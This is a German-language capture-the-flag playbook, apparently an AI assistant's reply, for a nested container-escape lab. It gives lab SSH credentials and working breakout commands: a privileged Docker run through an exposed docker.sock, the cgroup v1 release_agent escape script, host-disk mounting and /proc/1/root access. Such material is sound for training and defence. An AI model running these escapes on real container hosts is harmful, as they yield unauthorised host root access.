# Matryoshka Containment Unit – Playbook

Du startest in einem inneren Container. Du musst dich Schicht für Schicht nach außen arbeiten:

```
[ Host ]            <- Host flag
  └─ [ Outer container ]   <- Level 3 flag
        └─ [ Inner container ]  <- Level 2 flag (du startest hier nach SSH)
```

## 0) Verbindung

```bash
ssh matryoshka@10.112.139.147
# pw: n03sk@p3
```

Lade `enum.sh` hoch und führe es aus:

```bash
# vom Angreifer-Host:
scp enum.sh matryoshka@10.112.139.147:/tmp/
# in der SSH-Session:
bash /tmp/enum.sh | tee /tmp/layer1.txt
```

## 1) Was du in `enum.sh`-Output suchst

Auf jeder Ebene gibt es genau EINEN Escape-Vektor. Häufigste Matryoshka-Vektoren:

| Symptom in enum.sh                                                    | Vektor                                           |
|------------------------------------------------------------------------|--------------------------------------------------|
| `/var/run/docker.sock` existiert + lesbar                              | **Docker socket** → starte privileged Container  |
| `CapEff: ...0000003fffffffff` / `cap_sys_admin` aktiv + `/sys/fs/cgroup` writable | **cgroup v1 release_agent** Escape       |
| `privileged` / `/dev/sda` oder `/dev/vda` sichtbar                     | **Mount host disk** direkt                       |
| `cap_sys_module` + `lsmod` ok                                          | Kernel module laden                              |
| `nsenter` + Zugriff auf `/proc/1/ns/*` vom Host                        | `nsenter --target 1`                             |
| SUID `docker`, `runc`, `containerd`, `lxc-attach`                      | Direkt nutzen                                    |
| `sudo -l` zeigt NOPASSWD                                               | sudo abuse                                       |

## 2) Häufigste Lösung pro Layer

### Layer 1 → Layer 2 (Level 2 flag)

Wahrscheinlich **Docker-Socket** im inneren Container gemountet.

```bash
# check:
ls -la /var/run/docker.sock
docker version 2>/dev/null

# escape: starte privileged container, mount äußeres root
docker run -it --rm --privileged --pid=host -v /:/hostfs alpine chroot /hostfs sh
# du landest in Layer 2
cat /root/flag.txt 2>/dev/null
find / -maxdepth 4 -iname 'flag*' 2>/dev/null
```

Falls **kein Docker** → cgroup-Trick (CAP_SYS_ADMIN + cgroup v1):

```bash
mkdir /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x
echo 1 > /tmp/cg/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cg/release_agent
cat > /cmd <<'EOF'
#!/bin/sh
ps -ef > /tmp/out
EOF
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
```

### Layer 2 → Layer 3 (Level 3 flag)

In Layer 2 wieder `enum.sh` laufen lassen. Typisch:

- Erneut Docker-in-Docker, oder
- `/dev/sda` als Block-Device sichtbar:

```bash
mkdir /mnt/host && mount /dev/sda1 /mnt/host
ls /mnt/host
chroot /mnt/host /bin/bash
```

### Layer 3 → Host

Meist **kernel capability** oder **disk mount**. Suche:

```bash
lsblk
fdisk -l 2>/dev/null
ls /dev/sd* /dev/vd* /dev/nvme*
```

Wenn keine Disk: prüfe `/proc/1/root` vom äußeren Layer (PID-Namespace shared?):

```bash
ls -la /proc/1/root/
cat /proc/1/root/root/flag.txt
```

## 3) Wo die Flags liegen

Auf jeder Ebene typisch:

```bash
ls /root /home /opt
cat /root/flag.txt
cat /flag*.txt
find / -maxdepth 5 -iname 'flag*' -o -iname '*level*flag*' 2>/dev/null
```

## 4) Ablauf-Cheatsheet

```bash
# layer 1
ssh matryoshka@10.112.139.147
bash /tmp/enum.sh | tee /tmp/l1.txt
# -> finde flag1 / level2 flag, escape

# layer 2 (nach escape)
bash /tmp/enum.sh | tee /tmp/l2.txt
cat <level3 flag>

# layer 3
bash /tmp/enum.sh | tee /tmp/l3.txt
cat <host flag>
```

Wenn du mir den Output von `enum.sh` (Layer 1) pastest, sage ich dir den exakten Escape-Befehl.
